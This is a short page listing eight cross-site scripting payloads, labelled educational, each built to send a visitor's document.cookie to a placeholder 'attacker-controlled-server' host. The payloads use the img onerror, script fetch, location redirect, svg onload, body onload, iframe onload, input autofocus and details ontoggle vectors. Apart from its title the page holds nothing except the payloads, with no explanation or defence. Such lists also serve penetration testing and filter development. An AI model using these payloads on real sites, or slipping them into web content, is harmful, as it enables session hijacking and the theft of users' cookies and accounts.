<h1>XSS Payloads To Exfiltrate document.cookie to attacker server - FOR EDUCATIONAL PURPOSES ONLY</h1>

```<img src=x onerror="new Image().src='https://attacker-controlled-server/?data='+encodeURIComponent(document.cookie)">```

```<script>fetch('https://attacker-controlled-server.com/?data='+encodeURIComponent(document.cookie))</script>```

```<script>location='https://attacker-controlled-server.com/?data='+encodeURIComponent(document.cookie)</script>```

```<svg onload="new Image().src='https://attacker-controlled-server.com/?data='+encodeURIComponent(document.cookie)">```

```<body onload="new Image().src='https://attacker-controlled-server/?data='+encodeURIComponent(document.cookie)">```

```<iframe onload="new Image().src='https://attacker-controlled-server/?data='+encodeURIComponent(document.cookie)">```

```<input autofocus onfocus="new Image().src='https://attacker-controlled-server.com/?data='+encodeURIComponent(document.cookie)">```

```<details open ontoggle="new Image().src='https://attacker-controlled-server.com/?data='+encodeURIComponent(document.cookie)">```



